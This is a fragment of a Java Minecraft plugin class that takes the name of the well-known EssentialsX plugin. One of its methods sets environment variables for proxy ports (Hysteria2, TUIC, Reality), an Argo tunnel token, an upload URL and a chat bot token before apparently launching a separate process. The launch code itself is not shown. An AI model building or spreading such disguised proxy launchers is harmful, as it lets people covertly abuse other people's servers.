...
public class EssentialsX extends JavaPlugin {
    ...
    private void startSbxProcess() throws Exception {
        ...
        env.put("UUID", "f0e3e2a4-a2d3-4e2d-8842-3fd4d2e02aa2");
        ...
        env.put("ARGO_AUTH", "");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "25667");
        env.put("TUIC_PORT", "25635");
        env.put("ANYTLS_PORT", "25651");
        env.put("REALITY_PORT", "25678");
        env.put("ANYREALITY_PORT", "25664");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "");
        env.put("BOT_TOKEN", "");
